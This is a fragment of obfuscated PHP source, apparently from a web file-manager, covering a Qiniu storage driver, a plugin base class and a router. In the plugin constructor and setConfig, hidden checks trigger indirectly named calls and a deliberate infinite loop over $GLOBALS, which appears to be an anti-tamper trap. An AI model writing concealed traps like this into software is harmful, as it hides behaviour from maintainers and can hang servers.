$ÚÔÑ–•·; $ëü«» = array($³ÙÆÔ‚Æ[1455] => $³ÙÆÔ‚Æ[1456]); $ï¢­¥±é = $ÌÙ±†ïì; $ş§”‰˜ = $this->auth->uploadToken($this->bucket, $ï¢­¥±é, $¢×Òô¡°, $ëü«», !0); $²¢àõŞ« = empty($this->region) || $this->region == $³ÙÆÔ‚Æ[1457] ? $³ÙÆÔ‚Æ[12] : $³ÙÆÔ‚Æ[386] . $this->region; $ûªöéñÏ = http_type() . "\x3a\57\57\x75\160\x6c\157\x61\x64{$²¢àõŞ«}\56\161\151\x6e\151\165\x70\x2e\143\x6f\x6d\x2f"; return array($³ÙÆÔ‚Æ[1458] => $ş§”‰˜, $³ÙÆÔ‚Æ[1459] => $ûªöéñÏ); } public function download($üœºµ¢ˆ, $¹Ô‡í«) { $½íöÇŠŞ = IO::getPathInner(IO::mkfile($¹Ô‡í«)); if (!($Õ¦ñòÏ˜ = $this->link($üœºµ¢ˆ))) { return !1; } $…ö±¡ı© = 0; $Óª›Ã¯Ò = 1024 * 200; $³š°”Òù = fopen($½íöÇŠŞ, $_SERVER[ä¿÷‹µ±][1460]); while (!0) { $¾ÂÏ©ŒĞ = $this->fileSubstr($üœºµ¢ˆ, $…ö±¡ı©, $Óª›Ã¯Ò); if ($¾ÂÏ©ŒĞ === !1) { return !1; } fwrite($³š°”Òù, $¾ÂÏ©ŒĞ); $…ö±¡ı© += $Óª›Ã¯Ò; if (strlen($¾ÂÏ©ŒĞ) < $Óª›Ã¯Ò) { break; } } fclose($³š°”Òù); return $¹Ô‡í«; } public function link($ùãº§ËØ, $ÈŞøâ…ë = '') { if (!$this->isFile($ùãº§ËØ)) { return !1; } $î¤«Ñ°ƒ = $this->getHost() . $_SERVER[ä¿÷‹µ±][8] . $this->pathEncode($ùãº§ËØ) . $ÈŞøâ…ë; return $this->auth->privateDownloadUrl($î¤«Ñ°ƒ, 3600 * 12); } public function fileOut($³«Ëö£Ê, $­ŸÁğÁ³ = false, $“Ü½˜ê‹ = false, $¬Úğ†Ùå = '') { $¨®ˆıö =& $_SERVER[ä¿÷‹µ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($³«Ëö£Ê, $­ŸÁğÁ³, $“Ü½˜ê‹, $¬Úğ†Ùå); } if (!$“Ü½˜ê‹) { $“Ü½˜ê‹ = $this->pathThis($³«Ëö£Ê); } $öªšâş = $­ŸÁğÁ³ ? $¨®ˆıö[1461] . rawurlencode($“Ü½˜ê‹) : $¨®ˆıö[12]; $¸ı¤½€ = $this->link($³«Ëö£Ê, $öªšâş); $this->fileOutLink($¸ı¤½€); } public function fileOutServer($á†â…¶¡, $÷åâóâ® = false, $ÜŒ®†Ğ = false, $õ¶°ù€Í = '') { parent::fileOut($á†â…¶¡, $÷åâóâ®, $ÜŒ®†Ğ, $õ¶°ù€Í); } public function fileOutImage($½ì‚ÊÚ, $úÚŸ¨ë¡ = 250) { $–ÆÂì­â = $this->link($½ì‚ÊÚ, $_SERVER[ä¿÷‹µ±][1462] . $úÚŸ¨ë¡); $this->fileOutLink($–ÆÂì­â); } public function fileOutImageServer($ğÚ‰îø, $éø§ïü = 250) { parent::fileOutImage($ğÚ‰îø, $éø§ïü); } public function hashMd5($Ë÷¾¡ñ) { $¸û®Ãı÷ =& $_SERVER[ä¿÷‹µ±]; $–°Õª€ã = $this->objectMeta($Ë÷¾¡ñ); return isset($–°Õª€ã[$¸û®Ãı÷[212]]) ? $–°Õª€ã[$¸û®Ãı÷[212]] : !1; $Ş™ã©Ù™ = $this->link($Ë÷¾¡ñ, $¸û®Ãı÷[1463]); } public function size($×‡ ø³ñ) { $ÌÊæƒİÏ = $this->objectMeta($×‡ ø³ñ); return $ÌÊæƒİÏ ? $ÌÊæƒİÏ[$_SERVER[ä¿÷‹µ±][76]] : 0; } public function info($ÄÅöóğÑ) { if ($this->isFolder($ÄÅöóğÑ)) { return $this->folderInfo($ÄÅöóğÑ); } else { if ($this->isFile($ÄÅöóğÑ)) { return $this->fileInfo($ÄÅöóğÑ); } } return !1; } public function exist($ìÙâÊËŒ) { return $this->isFile($ìÙâÊËŒ) || $this->isFolder($ìÙâÊËŒ); } public function isFile($¡ô÷Çø) { return !$this->isFolder($¡ô÷Çø) && $this->objectMeta($¡ô÷Çø); } public function isFolder($ä¨ÀƒôÖ) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][165], $ä¨ÀƒôÖ); } protected function objectMeta($ƒÚ×Ü­Ü) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][167], $ƒÚ×Ü­Ü); } protected function _objectMeta($ğëË©é) { $ÒÃÑ·ÙÏ =& $_SERVER[ä¿÷‹µ±]; list($ÇÔİÛç, $åÇĞ‡¯ß) = $this->bucketManager->stat($this->bucket, $ğëË©é); if ($ÇÔİÛç) { $ÇÔİÛç[$ÒÃÑ·ÙÏ[76]] = intval($ÇÔİÛç[$ÒÃÑ·ÙÏ[1449]]); } return $ÇÔİÛç; } protected function _isFolder($Ì ÚŒû») { $æ¼ïÂµ =& $_SERVER[ä¿÷‹µ±]; if ($Ì ÚŒû» == $æ¼ïÂµ[12] || $Ì ÚŒû» == $æ¼ïÂµ[8]) { return !0; } list($¶’éú, $áËª·Ó–) = $this->bucketManager->listFiles($this->bucket, trim($Ì ÚŒû», $æ¼ïÂµ[8]) . $æ¼ïÂµ[8], $æ¼ïÂµ[12], 1, $æ¼ïÂµ[8]); return !empty($¶’éú[$æ¼ïÂµ[1452]]) || !empty($¶’éú[$æ¼ïÂµ[1453]]) ? !0 : !1; } } goto F“Œº³¨‘ß; FÔŞöòŞá: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $äíòÒŒ =& $_SERVER[ä¿÷‹µ±]; if (!isset($_SERVER[$äíòÒŒ[894]]) || !isset($_SERVER[$äíòÒŒ[934]])) { $ÚîòÄá = $äíòÒŒ[895]; $©›³µÛœ = $äíòÒŒ[896]; $Ñ¤â±“Å = $_SERVER[$äíòÒŒ[891]] . $äíòÒŒ[892]; $íış´á» = $©›³µÛœ($Ñ¤â±“Å); $ò‘ıŸÎÍ = explode($äíòÒŒ[231], $íış´á»); if (count($ò‘ıŸÎÍ) < $äíòÒŒ[619]) { $à €äæÎ = $äíòÒŒ[897]; $à €äæÎ(); } $”Á‚æèŠ = $äíòÒŒ[898]; $”Á‚æèŠ($_SERVER[$äíòÒŒ[899]]); $ôœ“·ø¿ = 1; for ($–±Â¹â½ = $ôœ“·ø¿; $–±Â¹â½ > 0; $–±Â¹â½++) { $”Á‚æèŠ = json_encode($GLOBALS[$äíòÒŒ[418]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($äíòÒŒ[1543]); $this->pluginName = str_replace($äíòÒŒ[1543], $äíòÒŒ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $äíòÒŒ[8]; $this->pluginApi = appHostGet() . $äíòÒŒ[1544] . $this->pluginName . $äíòÒŒ[8]; $this->pluginHost = $config[$äíòÒŒ[1545]] . $this->pluginName . $äíòÒŒ[8]; $this->pluginHostDefault = $config[$äíòÒŒ[1545]] . $this->pluginName . $äíòÒŒ[8]; $Ü£Áï­ = $config[$äíòÒŒ[1546]]; if ($Ü£Áï­ && strpos($äíòÒŒ[50] . $Ü£Áï­ . $äíòÒŒ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$äíòÒŒ[1547]] . $this->pluginName . $äíòÒŒ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ä¿÷‹µ±][1548]); } protected function assign($¿ê„‰ˆÖ, $Ô€µ•÷® = false) { if (is_array($¿ê„‰ˆÖ)) { $this->values = array_merge($this->values, $¿ê„‰ˆÖ); } else { $this->values[$¿ê„‰ˆÖ] = $Ô€µ•÷®; } } protected function display($ãúö˜Û•) { extract($this->values); require $ãúö˜Û•; } final function hookRegist($‚ûÒ±ëû) { $this->modelPlugin->appRegist($this->pluginName, $‚ûÒ±ëû); } final function appIcon() { $âÛ’ÅŞÕ =& $_SERVER[ä¿÷‹µ±]; $ñ¼Ú·Ïº = $this->appPackage(); $ÜÈŸ…ú² = $âÛ’ÅŞÕ[12]; if (isset($ñ¼Ú·Ïº[$âÛ’ÅŞÕ[416]])) { if (isset($ñ¼Ú·Ïº[$âÛ’ÅŞÕ[416]][$âÛ’ÅŞÕ[1549]])) { $ÜÈŸ…ú² = $âÛ’ÅŞÕ[1550] . $ñ¼Ú·Ïº[$âÛ’ÅŞÕ[416]][$âÛ’ÅŞÕ[1549]] . $âÛ’ÅŞÕ[1551]; } else { if ($ñ¼Ú·Ïº[$âÛ’ÅŞÕ[416]][$âÛ’ÅŞÕ[1552]]) { $ÜÈŸ…ú² = $âÛ’ÅŞÕ[1553] . $ñ¼Ú·Ïº[$âÛ’ÅŞÕ[416]][$âÛ’ÅŞÕ[1552]] . $âÛ’ÅŞÕ[1554]; } } } return $ÜÈŸ…ú²; } final function fileCanView($‡è’îÈ£) { $Ê¸å†ãÇ =& $_SERVER[ä¿÷‹µ±]; if (request_url_safe($‡è’îÈ£)) { return !0; } if ($this->isShare($‡è’îÈ£)) { return !0; } $±æúæè = Session::get($Ê¸å†ãÇ[1555]); if (!$±æúæè || !$±æúæè[$Ê¸å†ãÇ[1556]]) { $ÕÒ¥ó = $Ê¸å†ãÇ[1557] . rawurlencode(this_url()); show_tips(LNG($Ê¸å†ãÇ[1558]) . $Ê¸å†ãÇ[1559] . $ÕÒ¥ó . $Ê¸å†ãÇ[1560] . LNG($Ê¸å†ãÇ[1561]) . $Ê¸å†ãÇ[1562], !1); } if (!Action($Ê¸å†ãÇ[1563])->authCan($Ê¸å†ãÇ[1564])) { show_tips(LNG($Ê¸å†ãÇ[1565]) . $Ê¸å†ãÇ[1566], !1); } ActionCall($Ê¸å†ãÇ[1567], $‡è’îÈ£); } final function isShare($ïÔõ­¶) { $»üáä¥¨ = KodIO::parse($ïÔõ­¶); return $»üáä¥¨[$_SERVER[ä¿÷‹µ±][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¸¹´µ™¡) { if (request_url_safe($¸¹´µ™¡)) { return $¸¹´µ™¡; } if (!$this->isShare($¸¹´µ™¡)) { $¸¹´µ™¡ = $this->filePath($¸¹´µ™¡); } return Action($_SERVER[ä¿÷‹µ±][1197])->linkOut($¸¹´µ™¡); } public function filePathLinkOut($åÁÛÓÉ•) { if (request_url_safe($åÁÛÓÉ•)) { return $åÁÛÓÉ•; } $this->fileCanView($åÁÛÓÉ•); return Action($_SERVER[ä¿÷‹µ±][1197])->link($åÁÛÓÉ•); } final function filePath($ÃÚ³—ò) { $„“à–û =& $_SERVER[ä¿÷‹µ±]; if ($¢äê²Öñ = $this->checkSharePath($ÃÚ³—ò)) { Hook::trigger($„“à–û[1568], $¢äê²Öñ); return $¢äê²Öñ; } $this->fileCanView($ÃÚ³—ò); if (request_url_safe($ÃÚ³—ò)) { $ÛŞÒÜ´× = parse_url_query($ÃÚ³—ò); if (isset($ÛŞÒÜ´×[$„“à–û[1569]]) && isset($ÛŞÒÜ´×[$„“à–û[213]])) { $©¯ Â¢è = Model($„“à–û[789])->get($„“à–û[790]); $öœšç·ó = Mcrypt::decode($ÛŞÒÜ´×[$„“à–û[213]], $©¯ Â¢è); if ($öœšç·ó) { $this->fileInfo = IO::infoWithChildren($öœšç·ó); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $öœšç·ó; } } $ÃÚ³—ò = $this->_cacheHttpFile($ÃÚ³—ò); $this->fileInfo = IO::infoWithChildren($ÃÚ³—ò); } else { $this->fileInfo = IO::infoWithChildren($ÃÚ³—ò); if (!$this->fileInfo) { show_tips(LNG($„“à–û[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($„“à–û[1568], $ÃÚ³—ò); return $ÃÚ³—ò; } final function _cacheHttpFile($ÎÆãØ‚) { $ ÙÈ”î¨ = hash_path($ÎÆãØ‚, !0); $this->cachePath = $this->pluginCachePath($ ÙÈ”î¨); if ($ ÎÂ£ = IO::fileNameExist($this->cachePath, $ ÙÈ”î¨)) { return KodIO::make($ ÎÂ£); } $İ›¶¨¸® = $this->cachePath . $ ÙÈ”î¨; return $this->pluginCacheFileSet($İ›¶¨¸®, file_get_contents_nossl($ÎÆãØ‚)); } final function _tmpFileName($«Û“ä‚ª = array()) { $›Êä™ÙØ =& $_SERVER[ä¿÷‹µ±]; if (!$«Û“ä‚ª) { $«Û“ä‚ª = $this->fileInfo; } if (isset($«Û“ä‚ª[$›Êä™ÙØ[177]])) { return $«Û“ä‚ª[$›Êä™ÙØ[177]]; } if (isset($«Û“ä‚ª[$›Êä™ÙØ[170]][$›Êä™ÙØ[177]])) { return $«Û“ä‚ª[$›Êä™ÙØ[170]][$›Êä™ÙØ[177]]; } $ç†ÃÈİ = IO::hashSimple($«Û“ä‚ª[$›Êä™ÙØ[84]]); if ($ç†ÃÈİ) { return $ç†ÃÈİ; } $Êò—Œ¢ğ = array($«Û“ä‚ª[$›Êä™ÙØ[32]], $«Û“ä‚ª[$›Êä™ÙØ[84]], $«Û“ä‚ª[$›Êä™ÙØ[76]]); if (isset($«Û“ä‚ª[$›Êä™ÙØ[521]])) { $Êò—Œ¢ğ[] = $«Û“ä‚ª[$›Êä™ÙØ[521]]; } return md5(implode($›Êä™ÙØ[11], $Êò—Œ¢ğ)); } final function checkSharePath($‡ÖÈÄßÊ) { $ µÉšù =& $_SERVER[ä¿÷‹µ±]; if (!defined($ µÉšù[475])) { define($ µÉšù[514], 0); } if (!$this->isShare($‡ÖÈÄßÊ)) { return !1; } $Œ§±”· = Action($ µÉšù[1197])->sharePathInfo($‡ÖÈÄßÊ); if (!isset($Œ§±”·[$ µÉšù[84]])) { show_json(LNG($ µÉšù[1570]), !1); } $this->fileInfo = $Œ§±”·[$ µÉšù[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ µÉšù[177]]); return $Œ§±”·[$ µÉšù[84]]; } final function pluginCachePath($º”Ç‘ÜØ = '') { $ÉšèÂƒ¥ =& $_SERVER[ä¿÷‹µ±]; $Àªƒ´ = IO_PATH_SYSTEM_TEMP . $ÉšèÂƒ¥[1571] . $this->pluginName; if (!($ƒŞÁ¤ğ¤ = IO::infoFull($Àªƒ´))) { return IO::mkdir($Àªƒ´ . $ÉšèÂƒ¥[8] . $º”Ç‘ÜØ); } if (empty($º”Ç‘ÜØ)) { return $ƒŞÁ¤ğ¤[$ÉšèÂƒ¥[84]]; } if (!($©¾Ğ« = IO::fileNameExist($ƒŞÁ¤ğ¤[$ÉšèÂƒ¥[84]], $º”Ç‘ÜØ))) { return IO::mkdir($ƒŞÁ¤ğ¤[$ÉšèÂƒ¥[84]] . $º”Ç‘ÜØ); } return KodIO::make($©¾Ğ«); } final function pluginCacheFileSet($¤×í«—”, $“ÈÔêˆÄ = '') { $§Óü¸å =& $_SERVER[ä¿÷‹µ±]; if (!($Ù¹¦°şº = IO::infoFull($¤×í«—”))) { return IO::mkfile($¤×í«—”, $“ÈÔêˆÄ, REPEAT_REPLACE); } IO::setContent($Ù¹¦°şº[$§Óü¸å[84]], $“ÈÔêˆÄ); return $Ù¹¦°şº[$§Óü¸å[84]]; } final function pluginLocalFile($’İáç¼Ğ = '') { $ãóŒÊóê =& $_SERVER[ä¿÷‹µ±]; $ï‰Ù¿ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ï‰Ù¿)) { mk_dir($ï‰Ù¿); } if (!$’İáç¼Ğ) { return $ï‰Ù¿; } $¡µ¨ÛÕ… = IO::info($’İáç¼Ğ); $ƒ™¾à = $this->_tmpFileName($¡µ¨ÛÕ…) . $ãóŒÊóê[10] . $¡µ¨ÛÕ…[$ãóŒÊóê[174]]; if (!checkExtSafe($ƒ™¾à)) { $ƒ™¾à = $ƒ™¾à . $ãóŒÊóê[1572]; } $“µÉëñ— = $ï‰Ù¿ . $ƒ™¾à; if (@file_exists($“µÉëñ—)) { return $“µÉëñ—; } return IO::copy($’İáç¼Ğ, $ï‰Ù¿, 0, $ƒ™¾à); } final function appPackage() { $˜Ì»‚İŒ =& $_SERVER[ä¿÷‹µ±]; if ($this->packageData) { return $this->packageData; } $Ä£•‰¿‰ = $this->parseFile($this->pluginPath . $˜Ì»‚İŒ[1573]); $this->parseLang($Ä£•‰¿‰); $„˜£¿é¢ = json_decode_force($Ä£•‰¿‰); if (!$„˜£¿é¢) { return array(); } $Ã…Ù“²œ = Hook::trigger($˜Ì»‚İŒ[1574], $„˜£¿é¢); if ($Ã…Ù“²œ && is_array($Ã…Ù“²œ)) { $„˜£¿é¢ = $Ã…Ù“²œ; } $this->packageData = $„˜£¿é¢; return $„˜£¿é¢; } public function packageInfoGet($â¾Íİß­) { $¯øäœÎ = $this->appPackage(); return array_get_value($¯øäœÎ, $â¾Íİß­); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ä¿÷‹µ±][1575]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ä¿÷‹µ±][1576]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ä¿÷‹µ±][1577]); } public function echoJsAssign($Óğ‚‡´, $ì•õ™È¦) { $this->echoJsAssignArr[$Óğ‚‡´] = $ì•õ™È¦; } private function parseFile($¹ÇÄÃÌÙ) { $‘ñÍ°‚¬ =& $_SERVER[ä¿÷‹µ±]; $¤ö¤Øè– = file_get_contents_nossl($¹ÇÄÃÌÙ); $ÑÉÜííØ = array($‘ñÍ°‚¬[1578], $‘ñÍ°‚¬[1579], $‘ñÍ°‚¬[1580], $‘ñÍ°‚¬[1581], $‘ñÍ°‚¬[1582], $‘ñÍ°‚¬[1583], $‘ñÍ°‚¬[1584]); $úëÖ¼ãè = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‘ñÍ°‚¬[89]][$‘ñÍ°‚¬[1585]]); foreach ($this->echoJsAssignArr as $´ÇŒ¬İÙ => $Ñ´ôÏëğ) { $ÑÉÜííØ[] = $‘ñÍ°‚¬[1586] . $´ÇŒ¬İÙ . $‘ñÍ°‚¬[1587]; $úëÖ¼ãè[] = is_array($Ñ´ôÏëğ) || is_object($Ñ´ôÏëğ) ? rawurlencode(json_encode($Ñ´ôÏëğ)) : $Ñ´ôÏëğ; } if (strstr($¤ö¤Øè–, $‘ñÍ°‚¬[1588])) { $Ü°Æ¾ŒÖ = rawurlencode(json_encode($this->pluginLangArr)); $¤ö¤Øè– = str_replace($‘ñÍ°‚¬[1588], $Ü°Æ¾ŒÖ, $¤ö¤Øè–); } if (strstr($¤ö¤Øè–, $‘ñÍ°‚¬[1589])) { $Ü°Æ¾ŒÖ = $Ü°Æ¾ŒÖ = rawurlencode(json_encode($this->getConfig())); $¤ö¤Øè– = str_replace($‘ñÍ°‚¬[1589], $Ü°Æ¾ŒÖ, $¤ö¤Øè–); } $¤ö¤Øè– = str_replace($ÑÉÜííØ, $úëÖ¼ãè, $¤ö¤Øè–); return $¤ö¤Øè–; } private function parseLang(&$í¥îó¿â) { $ÁÏÔô¾å =& $_SERVER[ä¿÷‹µ±]; $ÚŒæÓŒû = $ÁÏÔô¾å[1590]; if (!strstr($í¥îó¿â, $ÚŒæÓŒû)) { return; } preg_match_all($ÁÏÔô¾å[1591], $í¥îó¿â, $¬öÃ¢ß); if (!is_array($¬öÃ¢ß) || count($¬öÃ¢ß) == 0 || !is_array($¬öÃ¢ß[0]) || count($¬öÃ¢ß[0]) == 0) { return; } $€…Ó»ÓÇ = array(); $ÎÇ’“¾ç = array(); foreach ($¬öÃ¢ß[0] as $º¢ŒŒÎ) { $´ó¶â˜ = substr($º¢ŒŒÎ, strlen($ÚŒæÓŒû), -4); $ÂáïÖÈË = LNG($´ó¶â˜); $€…Ó»ÓÇ[] = $º¢ŒŒÎ; $ÎÇ’“¾ç[] = str_replace(array($ÁÏÔô¾å[231], $ÁÏÔô¾å[1100], $ÁÏÔô¾å[342], $ÁÏÔô¾å[118]), array($ÁÏÔô¾å[53], $ÁÏÔô¾å[53], $ÁÏÔô¾å[12], $ÁÏÔô¾å[1592]), $ÂáïÖÈË); } $í¥îó¿â = str_replace($€…Ó»ÓÇ, $ÎÇ’“¾ç, $í¥îó¿â); } private function parseConfig(&$ß“Ë®Ç€) { $Ú¨üÀš =& $_SERVER[ä¿÷‹µ±]; $Ö¾ñŠÀĞ = $Ú¨üÀš[1593]; if (!strstr($ß“Ë®Ç€, $Ö¾ñŠÀĞ)) { return; } preg_match_all($Ú¨üÀš[1594], $ß“Ë®Ç€, $ßµÅÎ›Ø); if (!is_array($ßµÅÎ›Ø) || count($ßµÅÎ›Ø) == 0 || !is_array($ßµÅÎ›Ø[0]) || count($ßµÅÎ›Ø[0]) == 0) { return; } $ÆÂœ¸ôó = $this->getConfig(); $ï¦Œç­½ = array(); $ç€ÓÜÇÁ = array(); foreach ($ßµÅÎ›Ø[0] as $è‡Ÿ­ûö) { $ğî£ñÚ = substr($è‡Ÿ­ûö, strlen($Ö¾ñŠÀĞ), -2); $ï¦Œç­½[] = $è‡Ÿ­ûö; $ç€ÓÜÇÁ[] = _get($ÆÂœ¸ôó, $ğî£ñÚ); } $ß“Ë®Ç€ = str_replace($ï¦Œç­½, $ç€ÓÜÇÁ, $ß“Ë®Ç€); } private function parsePackage(&$ªíÏŸéŞ) { $İï‰œÃ =& $_SERVER[ä¿÷‹µ±]; $ıŒš”æ = $İï‰œÃ[1595]; if (!strstr($ªíÏŸéŞ, $ıŒš”æ)) { return; } preg_match_all($İï‰œÃ[1596], $ªíÏŸéŞ, $ş¿¥²¤); if (!is_array($ş¿¥²¤) || count($ş¿¥²¤) == 0 || !is_array($ş¿¥²¤[0]) || count($ş¿¥²¤[0]) == 0) { return; } $®ÕÁĞ² = $this->appPackage(); $ÉÉ¹ƒ = array(); $÷±ÌÁµù = array(); foreach ($ş¿¥²¤[0] as $Ø‚§é‰•) { $Ú®á…‘ = substr($Ø‚§é‰•, strlen($ıŒš”æ), -2); $ÉÉ¹ƒ[] = $Ø‚§é‰•; $÷±ÌÁµù[] = _get($®ÕÁĞ², $Ú®á…‘); } $ªíÏŸéŞ = str_replace($ÉÉ¹ƒ, $÷±ÌÁµù, $ªíÏŸéŞ); } final function echoFile($—›³¡¦é, $æœŞ¿° = false) { $¤É¦â„Ø =& $_SERVER[ä¿÷‹µ±]; $à¶İâ¯â = $this->pluginPath . $—›³¡¦é; if (ACT == $¤É¦â„Ø[1597]) { echo $¤É¦â„Ø[1598] . $this->pluginName . $¤É¦â„Ø[8] . $—›³¡¦é . $¤É¦â„Ø[1599]; if (!file_exists($à¶İâ¯â)) { echo $¤É¦â„Ø[1600]; return; } } $ëîÜƒ® = $this->parseFile($à¶İâ¯â); $this->parseLang($ëîÜƒ®); $this->parseConfig($ëîÜƒ®); $this->parsePackage($ëîÜƒ®); if (is_array($æœŞ¿°)) { $ëîÜƒ® = str_replace(array_keys($æœŞ¿°), array_values($æœŞ¿°), $ëîÜƒ®); } echo $¤É¦â„Ø[231] . $ëîÜƒ®; } final function initLang() { $Ğì›Ä‘– =& $_SERVER[ä¿÷‹µ±]; $·ãªä› = $Ğì›Ä‘–[1601]; $´ó×ó ş = $this->pluginPath . $Ğì›Ä‘–[1602]; $ùÅù š = I18n::getType(); $ÓÙ‰¡À = array(); if (file_exists($´ó×ó ş . $ùÅù š . $Ğì›Ä‘–[857])) { $ÓÙ‰¡À = (include $´ó×ó ş . $ùÅù š . $Ğì›Ä‘–[857]); } else { if ($ùÅù š == $Ğì›Ä‘–[1603] && !file_exists($´ó×ó ş . $ùÅù š . $Ğì›Ä‘–[857]) && file_exists($´ó×ó ş . $Ğì›Ä‘–[1604])) { $ÓÙ‰¡À = (include $´ó×ó ş . $Ğì›Ä‘–[1604]); } else { if (file_exists($´ó×ó ş . $·ãªä› . $Ğì›Ä‘–[857])) { $ÓÙ‰¡À = (include $´ó×ó ş . $·ãªä› . $Ğì›Ä‘–[857]); } } } if (!is_array($ÓÙ‰¡À)) { return array(); } if (@count($ÓÙ‰¡À) > 0) { I18n::set($ÓÙ‰¡À); } return $ÓÙ‰¡À; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($€×§ßıŒ) { $Ïô„ú¶Õ =& $_SERVER[ä¿÷‹µ±]; if (!isset($_SERVER[$Ïô„ú¶Õ[894]]) || !isset($_SERVER[$Ïô„ú¶Õ[934]])) { $™¬îÓß = $Ïô„ú¶Õ[895]; $¤Õ¯¤ïà = $Ïô„ú¶Õ[896]; $˜¬’ß = $_SERVER[$Ïô„ú¶Õ[891]] . $Ïô„ú¶Õ[892]; $òä”ÍÊ = $¤Õ¯¤ïà($˜¬’ß); $ÓÇä·à® = explode($Ïô„ú¶Õ[231], $òä”ÍÊ); if (count($ÓÇä·à®) < $Ïô„ú¶Õ[619]) { $˜ØÌ©É  = $Ïô„ú¶Õ[897]; $˜ØÌ©É (); } $ƒáĞ”™â = $Ïô„ú¶Õ[898]; $ƒáĞ”™â($_SERVER[$Ïô„ú¶Õ[899]]); $ì‰ÚÒÛˆ = 1; for ($èˆÅ¤ = $ì‰ÚÒÛˆ; $èˆÅ¤ > 0; $èˆÅ¤++) { $ƒáĞ”™â = json_encode($GLOBALS[$Ïô„ú¶Õ[418]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $€×§ßıŒ); } public function onSetConfig($ÚÛ«º) { } public function onGetConfig($âµÆ•ï) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ƒ‹ãƒ€) { if ($ƒ‹ãƒ€ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($«’‘‘³± = "\160\154\165\x67\x69\156\x41\x75\164\x68") { $ÏĞè¼î =& $_SERVER[ä¿÷‹µ±]; if (!defined($ÏĞè¼î[475])) { return !1; } if (_get($GLOBALS, $ÏĞè¼î[503])) { return !0; } $’Ì¡¦ÖÆ = $this->getConfig(); if (!$’Ì¡¦ÖÆ[$«’‘‘³±]) { return !1; } return ActionCall($ÏĞè¼î[1605], $’Ì¡¦ÖÆ[$«’‘‘³±]); } public function url($Ù½àÉÌ¦, $«´ñ¬¯ó = '', $‚°…ñªÊ = true) { $àËÏß©È =& $_SERVER[ä¿÷‹µ±]; $ÓœòÜ®ö = $this->getConfig(); $ôÒı‡ı¾ = KOD_VERSION . $àËÏß©È[10] . KOD_VERSION_BUILD; $’ìü–¢Å = $this->packageVersion(); $ß•Öë€ = $ôÒı‡ı¾ . $àËÏß©È[386] . $’ìü–¢Å; if (substr($Ù½àÉÌ¦, 0, 4) == $àËÏß©È[148] || substr($Ù½àÉÌ¦, 0, 2) == $àËÏß©È[1389]) { $³Ÿô¸£é = $Ù½àÉÌ¦ . $àËÏß©È[1606] . $ß•Öë€; } else { if ($«´ñ¬¯ó == $àËÏß©È[12]) { $³Ÿô¸£é = $this->pluginHost . $Ù½àÉÌ¦ . $àËÏß©È[1606] . $ß•Öë€; } else { if ($«´ñ¬¯ó === $àËÏß©È[75]) { $³Ÿô¸£é = $this->pluginHost . $Ù½àÉÌ¦; } else { if ($«´ñ¬¯ó == $àËÏß©È[1607]) { $³Ÿô¸£é = STATIC_PATH . $Ù½àÉÌ¦ . $àËÏß©È[1606] . $ôÒı‡ı¾; } else { if ($«´ñ¬¯ó == $àËÏß©È[1608]) { $³Ÿô¸£é = APP_HOST . $àËÏß©È[1609] . $Ù½àÉÌ¦ . $àËÏß©È[1606] . $ôÒı‡ı¾; } else { if (isset($ÓœòÜ®ö[$«´ñ¬¯ó])) { $³Ÿô¸£é = $ÓœòÜ®ö[$«´ñ¬¯ó] . $Ù½àÉÌ¦ . $àËÏß©È[1606] . $ß•Öë€; } } } } } } if (!$‚°…ñªÊ) { return $³Ÿô¸£é; } echo $³Ÿô¸£é; } public function link($±ù˜“•í = false, $ŠÙºş÷ = '') { $ÆÒ—ƒ¯ =& $_SERVER[ä¿÷‹µ±]; if (!$±ù˜“•í) { $this->link($ÆÒ—ƒ¯[1610], $ÆÒ—ƒ¯[1608]); $this->link($ÆÒ—ƒ¯[1611], $ÆÒ—ƒ¯[1607]); $this->link($ÆÒ—ƒ¯[1612], $ÆÒ—ƒ¯[1607]); $this->link($ÆÒ—ƒ¯[1613], $ÆÒ—ƒ¯[1607]); $this->link($ÆÒ—ƒ¯[1614], $ÆÒ—ƒ¯[1607]); return; } $»´Á§Æ = $this->url($±ù˜“•í, $ŠÙºş÷, !1); if (substr($±ù˜“•í, -3) == $ÆÒ—ƒ¯[1615]) { echo $ÆÒ—ƒ¯[1616] . $»´Á§Æ . $ÆÒ—ƒ¯[1617] . $ÆÒ—ƒ¯[231]; } else { if (substr($±ù˜“•í, -4) == $ÆÒ—ƒ¯[1618]) { echo $ÆÒ—ƒ¯[1619] . $»´Á§Æ . $ÆÒ—ƒ¯[1620] . $ÆÒ—ƒ¯[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\136\x2f\135\x2b", "\x3a\156\x75\155" => "\x5b\60\55\71\x5d\53", "\x3a\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Úñ™³ö×, 